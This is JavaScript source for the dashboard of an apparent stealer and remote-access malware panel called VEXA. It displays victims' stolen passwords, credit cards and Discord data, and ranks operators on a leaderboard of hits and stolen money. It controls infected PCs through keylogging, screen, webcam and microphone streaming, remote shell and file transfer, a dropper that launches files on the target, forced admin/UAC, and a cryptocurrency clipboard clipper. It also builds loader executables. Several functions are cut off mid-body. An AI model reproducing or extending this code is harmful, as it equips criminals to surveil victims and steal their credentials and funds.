    const res = await fetch(`/api/hit/${hitId}/files`, { credentials: 'include' });
    if (!res.ok) {
        body.innerHTML = '<div class="hit-dash-err">Failed to load hit archive</div>';
        return showToast('Failed to load hit details', 'error');
    }
    const files = await res.json();
    currentHitId = hitId;
    currentHitFiles = files;

    const pathSet = new Set(files.map(f => f.path.replace(/\\/g, '/')));
    const tryPaths = (candidates) => {
        for (const p of candidates) {
            if (pathSet.has(p)) return p;
        }
        return null;
    };

    const paths = {
        system: tryPaths(['System_Info.txt']),
        summary: tryPaths(['Summary.txt']),
        passwords: tryPaths(['Passwords.txt']),
        creditCards: tryPaths(['Credit_Cards.txt']),
        discord: tryPaths(['Discord/Discord_Info.txt', 'Discord\\Discord_Info.txt'])
    };

    const texts = {};
    await Promise.all([
        paths.system && fetchHitZipText(hitId, paths.system).then(t => { texts.systemInfo = t; }),
        paths.summary && fetchHitZipText(hitId, paths.summary).then(t => { texts.summary = t; }),
        paths.passwords && fetchHitZipText(hitId, paths.passwords).then(t => { texts.passwords = t; }),
        paths.creditCards && fetchHitZipText(hitId, paths.creditCards).then(t => { texts.creditCards = t; }),
        paths.discord && fetchHitZipText(hitId, paths.discord).then(t => { texts.discord = t; })
    ]);

    renderHitDataDashboard(hitId, files, texts);
}

/* ==================== LEADERBOARD ==================== */
async function loadLeaderboard(type) {
    const el = document.getElementById('leaderboardContent');
    if (el) el.innerHTML = '<div class="f-loading">Loading...</div>';
    const res = await fetch(`/api/leaderboard/${type}`);
    if (!res.ok) { if (el) el.innerHTML = '<div class="f-loading">Failed to load</div>'; return; }
    const data = await res.json();

    if (!data.length) {
        if (el) el.innerHTML = '<div class="empty-state"><p>No data yet</p></div>';
        return;
    }

    const getValue = item => type === 'hits' ? item.count : formatMoney(item.total);
    const getLabel = item => type === 'hits'
        ? `${item.count} hit${item.count !== 1 ? 's' : ''}`
        : formatMoney(item.total);
    const getName  = item => escapeHtml(item.displayName || item.userId || 'Unknown');
    const getInitial = item => (item.displayName || item.userId || '?')[0].toUpperCase();

    const top3 = data.slice(0, 3);
    const rest  = data.slice(3);

    const podiumSlots = ['second', 'first', 'third'];
    const podiumOrder = [top3[1], top3[0], top3[2]]; // visual order: 2nd left, 1st center, 3rd right

    let podiumHtml = `<div class="lb-podium">`;
    podiumOrder.forEach((item, vi) => {
        if (!item) return;
        const rank = vi === 0 ? 2 : vi === 1 ? 1 : 3;
        const cls  = podiumSlots[vi];
        const rankActual = data.indexOf(item); // real index
        podiumHtml += `
        <div class="lb-podium-slot ${cls}">
            <div class="lb-avatar">
                ${rank === 1 ? '<span class="lb-crown" aria-hidden="true"><svg width="14" height="14" viewBox="0 0 24 24" fill="currentColor"><path d="M5 16L3 5l5.5 5L12 4l3.5 6L21 5l-2 11H5zm14 3c0 .6-.4 1-1 1H6c-.6 0-1-.4-1-1v-1h14v1z"/></svg></span>' : ''}
                ${getInitial(item)}
            </div>
            <div class="lb-podium-name">${getName(item)}</div>
            <div class="lb-podium-value">${getLabel(item)}</div>
            <div class="lb-block">${rank}</div>
        </div>`;
    });
    podiumHtml += `</div><div class="lb-baseline"></div>`;

    let listHtml = rest.length ? `<div class="lb-list">` : '';
    rest.forEach((item, i) => {
        listHtml += `
        <div class="lb-row">
            <span class="lb-rank">${i + 4}</span>
            <span class="lb-row-name">${getName(item)}</span>
            <span class="lb-row-val">${getLabel(item)}</span>
        </div>`;
    });
    if (rest.length) listHtml += `</div>`;

    if (el) el.innerHTML = podiumHtml + listHtml;
}

/** Keylogger tab polling �?" only while toggle is on and tab is visible. */
function startKeyloggerPollIfNeeded() {
    if (__keyloggerPollTimer) {
        clearInterval(__keyloggerPollTimer);
        __keyloggerPollTimer = null;
    }
    const tab = document.querySelector('.remote-tab.on')?.dataset?.remoteTab;
    if (tab !== 'keylogger' || !selectedPcId || !socket || !remoteKeylogWanted) return;
    const pull = () => {
        if (!selectedPcId || !socket || !remoteKeylogWanted) return;
        socket.emit('command-to-client', { targetSocketId: selectedPcId, command: 'keylogger_get', payload: {} });
    };
    pull();
    __keyloggerPollTimer = setInterval(pull, 1800);
}

/** Re-send screen capture params while the stream is on (fps/quality/monitor otherwise only apply on next toggle). */
function emitRemoteScreenParamsIfLive() {
    if (!socket || !selectedPcId || !remoteScreenWanted) return;
    socket.emit('command-to-client', {
        targetSocketId: selectedPcId,
        command: 'start_screen',
        payload: {
            source: document.getElementById('screenMonitor')?.value ?? '1',
            fps: parseInt(document.getElementById('screenFps')?.value ?? '20', 10),
            quality: parseInt(document.getElementById('screenQuality')?.value ?? '78', 10),
            requestId: 'videoFrame',
        },
    });
}

function scheduleEmitRemoteScreenParamsIfLive() {
    if (!remoteScreenWanted) return;
    if (__screenParamsDebounce) clearTimeout(__screenParamsDebounce);
    __screenParamsDebounce = setTimeout(() => {
        __screenParamsDebounce = null;
        emitRemoteScreenParamsIfLive();
    }, 360);
}

function scheduleEmitRemoteCamParamsIfLive() {

function requestFsOverlay(el) {
    if (!el) return;
    const r = el.requestFullscreen || el.webkitRequestFullscreen || el.mozRequestFullScreen || el.msRequestFullscreen;
    if (r) r.call(el).catch(() => {});
}

/** After socket reconnect or tab focus: re-join room is not enough �?" re-issue active stream commands. */
function resumeRemoteStreamsAfterTransportUp() {
    if (!socket || !selectedPcId) return;
    if (remoteScreenWanted) {
        clearLocalScreenFeed();
        setVideoInnerLoading('screen', true);
        armScreenFeedWaitTimer();

function initVideoResize() {
    const handle = document.getElementById('videoResizeHandle');
    const col    = document.getElementById('videoCol');
    if (!handle || !col) return;

    let dragging = false, startX, startW;

    handle.addEventListener('mousedown', e => {
        dragging = true;
        startX   = e.clientX;
        startW   = col.offsetWidth;
        handle.classList.add('dragging');
        document.body.style.cursor = 'ew-resize';
        document.body.style.userSelect = 'none';
        e.preventDefault();
    });

    window.addEventListener('mousemove', e => {
        if (!dragging) return;
        const dx   = e.clientX - startX;
        const newW = Math.min(600, Math.max(180, startW + dx));
        col.style.width = newW + 'px';
    });

    window.addEventListener('mouseup', () => {
        if (!dragging) return;
        dragging = false;
        handle.classList.remove('dragging');
        document.body.style.cursor = '';
        document.body.style.userSelect = '';
    });
}

function pathJoinRemote(dir, name) {
    const base = String(dir || '').replace(/[/\\]+$/, '');
    const leaf = String(name || '').replace(/^[/\\]+/, '');
    if (!base) return leaf;
    const sep = base.includes('\\') ? '\\' : '/';
    return base + sep + leaf;
}

/** Coalesce burst JPEG frames to one paint per display refresh per stream (cuts main-thread jank). */
const _vfRaf = { screen: null, cam: null };
const _vfPending = { screen: null, cam: null };

function updateFeedImg(type, src) {
    const kind = type === 'cam' ? 'cam' : 'screen';
    _vfPending[kind] = src;
    if (_vfRaf[kind]) return;
    _vfRaf[kind] = requestAnimationFrame(() => {
        _vfRaf[kind] = null;
        const useSrc = _vfPending[kind];
        _vfPending[kind] = null;
        if (!useSrc) return;
        const applyToImg = (img, fsImgId, fsWrapId) => {
            if (!img) return;
            img.src = useSrc;
            img.classList.add('live');
            const fsOn = fsWrapId && document.getElementById(fsWrapId)?.classList.contains('on');
            const fsImg = fsImgId ? document.getElementById(fsImgId) : null;
            if (fsOn && fsImg) fsImg.src = useSrc;
        };
        if (kind === 'cam') {
            if (!remoteCamWanted) return;
            clearCamFeedWaitTimer();
            document.getElementById('webcamInner')?.classList.remove('feed-loading');
            applyToImg(document.getElementById('webcamFeed'), 'fsWebcamImg', 'fsWebcam');
            document.getElementById('webcamLive')?.classList.add('on');
        } else {
            if (!remoteScreenWanted) return;
            clearScreenFeedWaitTimer();
            document.getElementById('screenInner')?.classList.remove('feed-loading');
            applyToImg(document.getElementById('screenFeed'), 'fsScreenImg', 'fsScreen');
            document.getElementById('screenLive')?.classList.add('on');
        }
    });
}

function formatPlaytime(ms) {
    const sec = Math.floor(ms / 1000);
    const d = Math.floor(sec / 86400);
    const h = Math.floor((sec % 86400) / 3600);
    const m = Math.floor((sec % 3600) / 60);
    if (d > 0) return `${d}d ${h}h ${m}m`;
    if (h > 0) return `${h}h ${m}m`;
    if (m > 0) return `${m}m`;
    return `${sec}s`;
}

function playRemoteAudioChunk(streamType, b64, sampleRate) {
    if (streamType === 'mic' && (!remoteMicWanted || micAudioMuted)) return;
    if (streamType === 'desktop' && (!remoteDesktopAudioWanted || desktopAudioMuted)) return;
    if (!b64 || !sampleRate) return;
    try {
        if (!remoteAudioCtx) remoteAudioCtx = new AudioContext({ sampleRate });
        remoteAudioCtx.resume().catch(() => {});
        const raw = Uint8Array.from(atob(b64), c => c.charCodeAt(0));
        const nB = raw.byteLength - (raw.byteLength % 2);
        const samples = new Int16Array(raw.buffer, raw.byteOffset, nB / 2);
        const buf = remoteAudioCtx.createBuffer(1, samples.length, sampleRate);
        const ch = buf.getChannelData(0);
        for (let i = 0; i < samples.length; i++) ch[i] = samples[i] / 32768;
        const src = remoteAudioCtx.createBufferSource();
        src.buffer = buf;
        const g = remoteAudioCtx.createGain();
        g.gain.value = 0.88;
        src.connect(g);
        g.connect(remoteAudioCtx.destination);
        const next = streamType === 'mic' ? micAudioNextTime : desktopAudioNextTime;
        const t0 = Math.max(remoteAudioCtx.currentTime, next);
        src.start(t0);
        const end = t0 + buf.duration;
        if (streamType === 'mic') micAudioNextTime = end;
        else desktopAudioNextTime = end;
    } catch (err) {
        console.warn('playRemoteAudioChunk', err);
    }
}

function formatMoney(amount) {
    if (amount == null || amount === '') return '0';
    const n = Number(amount);
    if (isNaN(n)) return '0';
    if (n >= 1e9) return (n / 1e9).toFixed(1) + 'B';
    if (n >= 1e6) return (n / 1e6).toFixed(1) + 'M';
    if (n >= 1e3) return (n / 1e3).toFixed(1) + 'K';
    return String(Math.round(n * 100) / 100);
}

function escapeHtml(str) {
    return String(str)

        .replace(/</g, '&lt;')
        .replace(/>/g, '&gt;')
        .replace(/"/g, '&quot;')

}

function setupSocketListeners() {
    if (!socket || socket.__dashListenersAttached) return;
    socket.__dashListenersAttached = true;

    socket.on('new-hit', hit => onNewHit(hit));

    const emitJoin = () => {
        const raw = currentUser?.complete && (currentUser.primaryDiscordId || currentUser.id);
        if (raw != null && raw !== '') socket.emit('join-user', String(raw));
    };
    socket.on('connect', () => {
        emitJoin();
        setRemoteDashConn('on');
    });
    if (socket.connected) {
        emitJoin();
        setRemoteDashConn('on');
    }
    socket.io.on('reconnect', () => {
        emitJoin();
        setRemoteDashConn('on');
        remoteAudioCtx?.resume().catch(() => {});
        try {
            getAudioCtx().resume().catch(() => {});
        } catch (err) { /* ignore */ }
        if (selectedPcId) {
            refreshRemoteCaps();
            pingAllClients();
        }
        resumeRemoteStreamsAfterTransportUp();
    });
    socket.on('disconnect', () => {
        setRemoteDashConn('off');
        setVideoInnerLoading('screen', false);
        setVideoInnerLoading('cam', false);
        clearScreenFeedWaitTimer();
        clearCamFeedWaitTimer();
    });
    socket.io.engine?.on?.('close', () => {
        if (!socket.connected) setRemoteDashConn('off');
    });
    socket.io.on('reconnect_attempt', () => setRemoteDashConn('reconnect'));
    socket.io.on('reconnect_failed', () => setRemoteDashConn('off'));
    if (!document.__dashVisBound) {
        document.__dashVisBound = true;
        document.addEventListener('visibilitychange', () => {
            if (document.visibilityState !== 'visible' || !socket?.connected) return;
            emitJoin();
            remoteAudioCtx?.resume().catch(() => {});
            try {
                getAudioCtx().resume().catch(() => {});
            } catch (err) { /* ignore */ }
            if (selectedPcId) {
                refreshRemoteCaps();
                pingAllClients();
                resumeRemoteStreamsAfterTransportUp();
            }
        });
    }

    socket.on('clients-update', (clients) => {
        clientsList = clients;
        Object.keys(pcPingMs).forEach((k) => {
            if (!clients.some((c) => c.id === k)) delete pcPingMs[k];
        });
        if (selectedPcId && !clients.some((c) => c.id === selectedPcId)) {
            stopAllRemoteStreamsForPc(selectedPcId);
            resetRemoteStreamDashboardState();
            selectedPcId = null;
            selectedPcClientId = null;
            selectedPcName = '';
            selectedPcIp = '';
            closeRemoteHitOverlay();
            updateRemoteSelectionBar();
        }
        const pcList = document.getElementById('pcList');
        if (pcList) {
            renderPcList(clients);
            const badge = document.getElementById('pcCountBadge');
            if (badge) badge.textContent = clients.length;
            if (userStatus.premium) startRemotePingLoop();
        }
    });

    socket.on('client-response', payload => {
        const fromSid = payload._fromClientSocketId;
        const { requestId, data, stream_type } = payload;
        const wrongPc =
            fromSid != null &&
            selectedPcId &&
            fromSid !== selectedPcId &&
            (requestId === 'videoFrame' ||
                requestId === 'streamError' ||
                requestId === 'audioFrame' ||
                requestId === 'audioError' ||
                requestId === 'keylogger_live' ||
                requestId === 'listFiles' ||
                (typeof requestId === 'string' && requestId.startsWith('listFiles_')) ||
                requestId === 'cmdOutput' ||
                (typeof requestId === 'string' && requestId.startsWith('upload_')) ||
                (typeof requestId === 'string' && requestId.startsWith('download_')) ||
                requestId === 'proc_list' ||
                requestId === 'proc_kill' ||
                requestId === 'proc_kill_batch' ||
                requestId === 'get_clipboard' ||
                requestId === 'set_clipboard' ||
                requestId === 'remote_caps' ||
                requestId === 'force_admin_set' ||
                requestId === 'force_uac_set' ||
                (typeof requestId === 'string' && requestId.startsWith('drop_')));
        if (wrongPc) return;
        if (requestId === 'listFiles' || (typeof requestId === 'string' && requestId.startsWith('listFiles_'))) {
            if (requestId !== 'listFiles') {
                const m = /^listFiles_(\d+)_/.exec(requestId);
                if (m && parseInt(m[1], 10) !== fileListReqSeq) return;
            }
            if (window.__fileListWaitTimer) {
                clearTimeout(window.__fileListWaitTimer);
                window.__fileListWaitTimer = null;
            }
            if (data.error) {
                const fb = document.getElementById('fileBrowser');
                if (fb) fb.innerHTML = `<div class="f-loading" style="color:var(--red)">Error: ${escapeHtml(data.error)}</div>`;
            } else {
                currentPath = data.path;
                const inp = document.getElementById('currentPathInput');
                if (inp) inp.value = data.path;
                displayFiles(data.items);
            }
        }
        if (typeof requestId === 'string' && requestId.startsWith('upload_')) {
            if (data && data.error) {
                showToast('Upload failed: ' + data.error, 'error', 5000);
            } else {
                showToast('Upload complete', 'success', 2200);
                requestFileList(currentPath);
            }
        }
        if (requestId === 'cmdOutput') {
            let s = '';
            if (typeof data === 'string') s = data;
            else if (data != null && typeof data === 'object') s = data.stdout != null || data.stderr != null ? String(data.stdout || '') + String(data.stderr || '') : JSON.stringify(data);
            else s = String(data ?? '');
            appendCmd(s);
        }
        if (requestId === 'videoFrame') {
            const isCam = stream_type === 'cam';
            const allow = isCam ? remoteCamWanted : remoteScreenWanted;
            if (allow) updateFeedImg(isCam ? 'cam' : 'screen', 'data:image/jpeg;base64,' + data);
        }
        if (requestId === 'streamError' && data?.error) {
            const isCam = stream_type === 'cam';
            setVideoInnerLoading(isCam ? 'cam' : 'screen', false);
            showToast((isCam ? 'Webcam' : 'Screen') + ': ' + data.error, 'error', 5200);
        }
        if (requestId === 'audioFrame' && data) {
            const sr = payload.sampleRate || 16000;
            playRemoteAudioChunk(stream_type, data, sr);
        }
        if (requestId === 'audioError' && data?.error) {
            const lab = stream_type === 'desktop' ? 'Desktop audio' : 'Microphone';
            showToast(lab + ': ' + data.error, 'error', 4500);
        }
        if (requestId === 'keylogger_live' && remoteKeylogWanted) {
            if (__keylogLoadingTimer) {
                clearTimeout(__keylogLoadingTimer);
                __keylogLoadingTimer = null;
            }
            setKeylogLoadingUi(false);
            const kd = document.getElementById('keylogDisplay');
            if (kd) kd.textContent = data;
        }
        if (requestId?.startsWith('download_') && data?.data) {
            const a = document.createElement('a');
            a.href = 'data:application/octet-stream;base64,' + data.data;
            a.download = requestId.split('_').slice(1).join('_') || 'file';
            a.click();
        }
        if (requestId === 'troll_toggle_response' && data) {
            if (data.__notice) {
                showToast(String(data.__notice), 'error', 5200);
                delete data.__notice;
            }
            trollState = data;
            syncToggles();
        }
        if (requestId === 'remote_caps' && data) applyRemoteCaps(data);
        if ((requestId === 'force_uac_set' || requestId === 'force_admin_set') && data) {
            if (data.error) showToast(String(data.error), 'error', 4000);
            applyRemoteCaps(data);
        }
        if (typeof requestId === 'string' && requestId.startsWith('drop_')) {
            if (data?.error) showToast('Dropper: ' + data.error, 'error', 6500);
            else if (data?.success) showToast('File saved and launched on target.', 'success', 4000);
        }
        if (requestId === 'proc_list') {
            const tb = document.getElementById('processTableBody');
            if (!tb) return;
            if (!data || data.error) {
                tb.innerHTML = `<div class="tm-empty" style="color:var(--red)">${escapeHtml(data?.error || 'Error')}</div>`;
                return;
            }
            const procs = data.processes || [];
            if (!procs.length) {
                tb.innerHTML = '<div class="tm-empty">No processes returned.</div>';
                return;
            }
            tb.innerHTML = procs.map(p => {
                const fname = String(p.name || '');
                const safeAttr = (`${p.pid} ${fname}`).replace(/"/g, '&quot;');
                return `
                <div class="tm-process-row" data-filter="${safeAttr}">
                    <span class="tm-cell tm-sel"><input type="checkbox" class="proc-pick" data-pid="${p.pid}" aria-label="Select PID ${p.pid}"></span>
                    <span class="tm-cell tm-pid">${p.pid}</span>
                    <span class="tm-cell tm-pname" title="${escapeHtml(fname)}">${escapeHtml(fname)}</span>
                    <span class="tm-cell tm-act"><button type="button" class="tm-end-btn proc-kill" data-pid="${p.pid}">End task</button></span>
                </div>`;
            }).join('');
            filterProcessRows();
        }
        if (requestId === 'proc_kill') {
            if (data?.success) { showToast('Process ended', 'success'); document.getElementById('refreshProcessList')?.click(); }
            else showToast(data?.error || 'Could not end process', 'error');
        }
        if (requestId === 'proc_kill_batch') {
            if (data?.error) showToast(data.error, 'error');
            else {
                const n = data?.ended ?? 0;
                const tot = data?.total ?? 0;
                showToast(`Ended ${n}/${tot} task(s)`, n ? 'success' : 'info', 3200);
                document.getElementById('refreshProcessList')?.click();
            }
        }
        if (requestId === 'get_clipboard') { const cc = document.getElementById('clipboardContent'); if (cc) cc.value = data || ''; }
        if (requestId === 'clipper_config' && data) {
            ['btc','eth','ltc','usdc','usdt'].forEach(c => {
                const en = document.getElementById(c+'Enabled'); const ad = document.getElementById(c+'Address');
                if (en) en.checked  = data[c]?.enabled  || false;
                if (ad) ad.value    = data[c]?.address   || '';
            });
        }
        if (requestId === 'ping_rtt' && data && data.id != null) {
            const pend = pendingPingById.get(data.id);
            if (!pend) return;
            pendingPingById.delete(data.id);
            const relay = Number(payload.rttRelayMs);
            const ms = Number.isFinite(relay) ? Math.round(relay) : Date.now() - pend.t;
            pcPingMs[pend.sid] = ms;
            document.querySelectorAll('.pc-ping').forEach((el) => {
                if (el.dataset.pc === pend.sid) el.textContent = ms + ' ms';
            });
        }
    });
}

<script>
/* ==================== BUILD LOADING OVERLAY JS ==================== */
(function() {
    window.showBuildOverlay = function(isExe) {
        const overlay = document.getElementById('buildLoadingOverlay');
        if (!overlay) return;
        const fname = document.getElementById('bloFilename');
        if (fname) fname.textContent = isExe ? 'VEXA-loader.exe' : 'VEXA.jar';
        overlay.style.display = 'flex';
        requestAnimationFrame(() => overlay.classList.add('blo-visible'));
    };

    window.hideBuildOverlay = function(success) {
        const overlay = document.getElementById('buildLoadingOverlay');
        if (!overlay) return;
        if (success) {
            const wrap = document.getElementById('bloSuccessWrap');
            if (wrap) { wrap.classList.add('active'); setTimeout(() => wrap.classList.remove('active'), 800); }
            setTimeout(close, 900);
        } else {
            close();
        }
        function close() {
            overlay.classList.remove('blo-visible');
            setTimeout(() => { overlay.style.display = 'none'; }, 380);
        }
    };
})();
</script>
